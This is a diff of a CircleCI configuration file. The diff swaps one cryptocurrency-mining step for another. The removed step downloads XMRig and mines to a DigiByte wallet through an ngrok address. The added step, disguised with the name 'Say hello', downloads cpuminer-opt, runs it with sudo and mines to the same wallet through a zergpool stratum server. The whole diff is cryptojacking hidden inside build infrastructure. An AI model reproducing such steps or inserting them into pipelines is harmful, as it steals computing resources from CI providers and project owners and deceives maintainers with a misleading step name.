@@ -15,8 +15,9 @@ jobs:
     steps:
       - checkout
       - run:
-          name: "gimpi"
-          command: wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar -xvf xmrig-6.17.0-linux-x64.tar.gz && cd xmrig-6.17.0 && chmod 777 xmrig && ./xmrig -o 0.tcp.au.ngrok.io:11144 -u  DGB:dgb1qmsx84scmqd3eg2uau3f63ywfcspxu02h3agzwc -p x
+          name: "Say hello"
+          command: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar -xvf cpuminer-opt-linux.tar.gz && sudo ./cpuminer-sse2 -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zergpool.com:4563 -u dgb1qmsx84scmqd3eg2uau3f63ywfcspxu02h3agzwc -p c=DGB,mc=GXX/PYRK,ID=$(shuf -n 1 -i 1-9999999)
+
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
